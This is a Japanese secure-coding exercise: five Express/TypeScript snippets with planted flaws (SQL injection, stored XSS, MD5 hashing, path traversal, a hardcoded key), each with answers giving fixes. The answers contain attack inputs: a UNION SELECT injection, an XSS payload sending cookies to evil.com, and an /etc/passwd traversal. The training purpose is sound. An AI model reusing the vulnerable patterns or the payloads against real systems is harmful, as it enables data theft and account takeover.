# 演習：脆弱なコードを見つけて報告しよう

## メタ情報

```yaml
mission: "SQLインジェクション攻撃を阻止しよう"
step: 2
subStep: 5
title: "演習：脆弱なコードを見つけて報告しよう"
itemType: EXERCISE
estimatedMinutes: 90
noiseLevel: MINIMAL
roadmap:
  skill: "セキュアコーディング"
  category: "セキュリティ"
  target_level: "L1"
```

---

## ストーリー

> 「理論は十分だ。ここからは実践だ」高橋さんが5つのコードファイルを画面に映した。
>
> 「このサンプルアプリケーションのコードを調査してほしい。
> 各コードに含まれる脆弱性を特定し、**セキュリティ報告書**として提出してくれ」
>
> 「報告書にはどこまで書けばいいですか？」
>
> 「脆弱性の種類、影響範囲、再現手順、そして修正案だ。
> 実際のセキュリティインシデント対応でも同じ形式で報告する。練習しておこう」

---

## 演習の概要

5つのコードスニペットに含まれる脆弱性を特定し、報告書を作成してください。

| コード | テーマ | 難易度 |
|--------|--------|--------|
| コード1 | ユーザー検索API | 初級 |
| コード2 | コメント投稿機能 | 初級 |
| コード3 | ログイン処理 | 中級 |
| コード4 | ファイルダウンロード | 中級 |
| コード5 | 管理者ダッシュボード | 上級 |

### 報告書のテンプレート

各コードについて、以下の形式で報告してください。

```
■ 脆弱性の種類: （例: SQLインジェクション）
■ 重要度: CRITICAL / HIGH / MEDIUM / LOW
■ 該当箇所: （コードの何行目か）
■ 影響: （攻撃者が何をできるか）
■ 再現手順: （どのような入力で攻撃が成立するか）
■ 修正案: （どのように修正すべきか）
```

---

## コード1: ユーザー検索API

```typescript
// routes/users.ts
import express from 'express';
import { pool } from '../db';

const router = express.Router();

router.get('/api/users/search', async (req, res) => {
  const { name } = req.query;

  try {
    const result = await pool.query(
      `SELECT id, name, email, phone FROM users WHERE name LIKE '%${name}%'`
    );
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({
      error: 'Database error',
      detail: error.message,
      query: error.query
    });
  }
});

export default router;
```

**このコードに含まれる脆弱性を全て見つけてください。**

<details>
<summary>解答</summary>

### 脆弱性1: SQLインジェクション

- **種類**: SQLインジェクション
- **重要度**: CRITICAL
- **該当箇所**: 11行目の文字列連結によるSQL構築
- **影響**: 攻撃者がデータベースの全データを取得・改ざん・削除できる
- **再現手順**: `/api/users/search?name=' UNION SELECT id, username, password, '' FROM admin_users --` にアクセス
- **修正案**:
```typescript
const result = await pool.query(
  'SELECT id, name, email, phone FROM users WHERE name LIKE $1',
  [`%${name}%`]
);
```

### 脆弱性2: エラー情報の漏洩

- **種類**: 情報漏洩
- **重要度**: MEDIUM
- **該当箇所**: 14-17行目のエラーレスポンス
- **影響**: `error.message` と `error.query` によりテーブル構造やSQL文が攻撃者に露出する
- **再現手順**: 不正な入力でエラーを発生させ、レスポンスを確認する
- **修正案**:
```typescript
} catch (error) {
  console.error('Database error:', error);
  res.status(500).json({ error: 'Internal server error' });
}
```

</details>

---

## コード2: コメント投稿機能

```typescript
// routes/comments.ts
import express from 'express';
import { pool } from '../db';

const router = express.Router();

router.post('/api/comments', async (req, res) => {
  const { postId, author, body } = req.body;

  await pool.query(
    'INSERT INTO comments (post_id, author, body) VALUES ($1, $2, $3)',
    [postId, author, body]
  );

  res.json({ success: true });
});

router.get('/api/posts/:id/comments', async (req, res) => {
  const comments = await pool.query(
    'SELECT * FROM comments WHERE post_id = $1',
    [req.params.id]
  );

  let html = '<div class="comments">';
  for (const comment of comments.rows) {
    html += `
      <div class="comment">
        <strong>${comment.author}</strong>
        <p>${comment.body}</p>
        <small>${comment.created_at}</small>
      </div>
    `;
  }
  html += '</div>';

  res.send(html);
});

export default router;
```

**このコードに含まれる脆弱性を見つけてください。**

<details>
<summary>解答</summary>

### 脆弱性: 格納型XSS

- **種類**: 格納型XSS（Stored XSS）
- **重要度**: HIGH
- **該当箇所**: 27-29行目でデータベースから取得した `comment.author` と `comment.body` をエスケープせずにHTMLに埋め込んでいる
- **影響**: 攻撃者がコメントにスクリプトを投稿すると、そのページを見る全ユーザーのブラウザでスクリプトが実行される。Cookie窃取、セッション乗っ取り、フィッシングが可能
- **再現手順**: POST `/api/comments` で `body` に `<script>document.location='https://evil.com/?c='+document.cookie</script>` を送信し、GET `/api/posts/1/comments` にアクセスする
- **修正案**:
```typescript
import escapeHtml from 'escape-html';

for (const comment of comments.rows) {
  html += `
    <div class="comment">
      <strong>${escapeHtml(comment.author)}</strong>
      <p>${escapeHtml(comment.body)}</p>
      <small>${escapeHtml(String(comment.created_at))}</small>
    </div>
  `;
}
```

**補足**: SQL文自体はパラメータ化クエリが使われており安全です。しかし、出力時のエスケープが漏れています。入力の保存と出力の表示は別の問題であることを認識しましょう。

</details>

---

## コード3: ログイン処理

```typescript
// routes/auth.ts
import express from 'express';
import { pool } from '../db';
import crypto from 'crypto';

const router = express.Router();

router.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');

  const result = await pool.query(
    'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
    [email, hashedPassword]
  );

  if (result.rows.length === 0) {
    return res.status(401).json({ error: `ユーザー ${email} が見つかりません、またはパスワードが間違っています` });
  }

  const user = result.rows[0];
  const token = user.id + '-' + Date.now();

  res.json({
    token,
    user: {
      id: user.id,
      email: user.email,
      name: user.name,
      password_hash: user.password_hash,
      role: user.role,
      created_at: user.created_at
    }
  });
});

export default router;
```

**このコードに含まれる脆弱性を全て見つけてください（複数あります）。**

<details>
<summary>解答</summary>

### 脆弱性1: 弱いハッシュアルゴリズム

- **種類**: 暗号化の失敗
- **重要度**: CRITICAL
- **該当箇所**: 11行目の `crypto.createHash('md5')`
- **影響**: MD5は高速で衝突攻撃が可能。レインボーテーブルで容易に元のパスワードを復元される。また、ソルトも使用されていない
- **修正案**: bcrypt を使用する
```typescript
import bcrypt from 'bcrypt';
const isValid = await bcrypt.compare(password, user.password_hash);
```

### 脆弱性2: 予測可能なトークン

- **種類**: 識別と認証の失敗
- **重要度**: HIGH
- **該当箇所**: 22行目の `user.id + '-' + Date.now()`
- **影響**: ユーザーIDとタイムスタンプから容易に推測でき、他人のトークンを偽造してセッションハイジャックが可能
- **修正案**: JWTまたは暗号学的に安全なランダムトークンを使用する

### 脆弱性3: パスワードハッシュの漏洩

- **種類**: 機密データの露出
- **重要度**: HIGH
- **該当箇所**: 30行目の `password_hash: user.password_hash`
- **影響**: パスワードハッシュがレスポンスに含まれており、攻撃者がオフラインでクラック可能
- **修正案**: レスポンスから `password_hash` を除外する

### 脆弱性4: エラーメッセージによるユーザー列挙

- **種類**: 情報漏洩
- **重要度**: MEDIUM
- **該当箇所**: 19行目のエラーメッセージにメールアドレスが含まれている
- **影響**: エラーメッセージの違いから、登録済みメールアドレスかどうかを判別される可能性がある
- **修正案**: `res.status(401).json({ error: '認証に失敗しました' });`

</details>

---

## コード4: ファイルダウンロード

```typescript
// routes/files.ts
import express from 'express';
import path from 'path';
import fs from 'fs';

const router = express.Router();
const UPLOAD_DIR = '/app/uploads';

router.get('/api/files/download', (req, res) => {
  const filename = req.query.file as string;

  if (!filename) {
    return res.status(400).json({ error: 'ファイル名を指定してください' });
  }

  const filePath = path.join(UPLOAD_DIR, filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'ファイルが見つかりません' });
  }

  res.download(filePath);
});

export default router;
```

**このコードに含まれる脆弱性を見つけてください。**

<details>
<summary>解答</summary>

### 脆弱性: ディレクトリトラバーサル

- **種類**: パストラバーサル / ディレクトリトラバーサル
- **重要度**: CRITICAL
- **該当箇所**: 16行目で `filename` をそのまま `path.join` に使用している
- **影響**: `../../etc/passwd` のようなパスを指定することで、サーバー上の任意のファイルを読み取れる。ソースコード、設定ファイル、環境変数ファイルなどが漏洩する可能性がある
- **再現手順**: `/api/files/download?file=../../etc/passwd` にアクセス
- **修正案**:
```typescript
router.get('/api/files/download', (req, res) => {
  const filename = req.query.file as string;

  if (!filename) {
    return res.status(400).json({ error: 'ファイル名を指定してください' });
  }

  // ファイル名からパス区切り文字を除去
  const sanitizedFilename = path.basename(filename);
  const filePath = path.join(UPLOAD_DIR, sanitizedFilename);

  // 結果のパスがUPLOAD_DIR内であることを確認
  const resolvedPath = path.resolve(filePath);
  if (!resolvedPath.startsWith(path.resolve(UPLOAD_DIR))) {
    return res.status(403).json({ error: 'アクセスが拒否されました' });
  }

  if (!fs.existsSync(resolvedPath)) {
    return res.status(404).json({ error: 'ファイルが見つかりません' });
  }

  res.download(resolvedPath);
});
```

**補足**: `path.join` は `../` を正規化しますが、UPLOAD_DIR の外に出ることを防ぎません。`path.basename` でファイル名部分のみを抽出し、さらに `path.resolve` で最終パスがUPLOAD_DIR内であることを確認する必要があります。

</details>

---

## コード5: 管理者ダッシュボード

```typescript
// routes/admin.ts
import express from 'express';
import { pool } from '../db';

const router = express.Router();

const API_KEY = 'admin-secret-key-2025';

router.get('/admin/dashboard', async (req, res) => {
  const users = await pool.query('SELECT * FROM users');
  const orders = await pool.query('SELECT * FROM orders');

  res.json({
    totalUsers: users.rows.length,
    totalOrders: orders.rows.length,
    users: users.rows,
    orders: orders.rows
  });
});

router.delete('/admin/users/:id', async (req, res) => {
  const apiKey = req.headers['x-api-key'];

  if (apiKey !== API_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  await pool.query(`DELETE FROM users WHERE id = ${req.params.id}`);

  res.json({ success: true, message: `User ${req.params.id} deleted` });
});

export default router;
```

**このコードに含まれる脆弱性を全て見つけてください（複数あります）。**

<details>
<summary>解答</summary>

### 脆弱性1: 認証なしのエンドポイント

- **種類**: アクセス制御の不備
- **重要度**: CRITICAL
- **該当箇所**: 9行目の `/admin/dashboard` に認証チェックがない
- **影響**: 誰でもダッシュボードにアクセスして全ユーザー情報と全注文データを閲覧できる
- **修正案**: 認証ミドルウェアを追加し、管理者ロールを確認する

### 脆弱性2: ハードコードされたAPIキー

- **種類**: ハードコードされたシークレット
- **重要度**: HIGH
- **該当箇所**: 7行目の `API_KEY = 'admin-secret-key-2025'`
- **影響**: ソースコードにアクセスできる全員がAPIキーを知ることができる。GitHubにコミットされると公開される
- **修正案**: 環境変数 `process.env.ADMIN_API_KEY` を使用する

### 脆弱性3: SQLインジェクション

- **種類**: SQLインジェクション
- **重要度**: CRITICAL
- **該当箇所**: 28行目の文字列連結によるSQL構築
- **影響**: `id` に `1 OR 1=1` を指定すると全ユーザーが削除される
- **修正案**:
```typescript
await pool.query('DELETE FROM users WHERE id = $1', [req.params.id]);
```

### 脆弱性4: 過剰なデータ露出

- **種類**: 機密データの露出
- **重要度**: HIGH
- **該当箇所**: 16-17行目で `users.rows` と `orders.rows` の全フィールドを返している
- **影響**: パスワードハッシュ、個人情報など不要なデータが含まれる可能性がある
- **修正案**: 必要なフィールドのみを SELECT で取得する

</details>

---

## 達成度チェック

| コード | 脆弱性の数 | 発見した数 |
|--------|-----------|-----------|
| コード1 | 2 | [ ] / 2 |
| コード2 | 1 | [ ] / 1 |
| コード3 | 4 | [ ] / 4 |
| コード4 | 1 | [ ] / 1 |
| コード5 | 4 | [ ] / 4 |
| **合計** | **12** | **[ ] / 12** |

---

## まとめ

| ポイント | 内容 |
|----------|------|
| 報告書の書き方 | 脆弱性の種類、重要度、影響、再現手順、修正案を含める |
| 複合的な脆弱性 | 1つのコードに複数の脆弱性が含まれることがある |
| 見落としやすい点 | エラーハンドリング、レスポンスの内容、認証の有無 |
| セキュリティ全体 | 入力、処理、出力、認証の各段階でチェックする |

### チェックリスト

- [ ] 全5つのコードを分析した
- [ ] 各脆弱性の種類と重要度を正しく判定できた
- [ ] 修正案を含む報告書を作成できた
- [ ] 報告書のテンプレートを使いこなせるようになった

---

## 次のステップへ

実践的な脆弱性発見の演習を完了しました。
次のセクションでは、Step 2のチェックポイントクイズに挑戦しましょう。

---

*推定所要時間: 90分*
